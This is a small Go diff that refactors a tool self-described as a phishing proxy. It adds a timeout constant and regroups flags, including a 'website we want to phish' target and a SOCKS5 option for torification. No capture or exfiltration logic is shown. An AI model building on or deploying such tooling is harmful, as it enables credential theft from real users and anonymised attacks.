@@ -14,10 +14,16 @@ import (
 	"golang.org/x/net/proxy"
 )
 
-var targetURL = flag.String("target", "", "The website we want to phish.")
-var address = flag.String("address", "localhost:8080", "Address and port to run proxy service on. Format address:port.")
-var attachProfiler = flag.Bool("with-profiler", false, "Attach profiler to instance.")
-var proxyAddress = flag.String("proxy", "", "Optional upstream SOCKS5 proxy. Useful for torification.")
+const (
+	DEFAULT_TIMEOUT = 20 * time.Second
+)
+
+var (
+	targetURL      = flag.String("target", "", "The website we want to phish")
+	address        = flag.String("address", "localhost:8080", "Address and port to run proxy service on. Format address:port.")
+	attachProfiler = flag.Bool("with-profiler", false, "Attach profiler to instance.")
+	proxyAddress   = flag.String("proxy", "", "Optional upstream SOCKS5 proxy. Useful for torification.")
+)
 
 // Phishes a target URL with a custom HTTP client.
 type PhishingProxy struct {
@@ -91,12 +97,12 @@ func main() {
 		httpTransport := &http.Transport{}
 		httpTransport.Dial = dialer.Dial
 		client = &http.Client{
-			Timeout:   20 * time.Second,
+			Timeout:   DEFAULT_TIMEOUT,
 			Transport: httpTransport,
 		}
 	} else {
 		client = &http.Client{
-			Timeout: 20 * time.Second,
+			Timeout: DEFAULT_TIMEOUT,
 		}
 	}
 
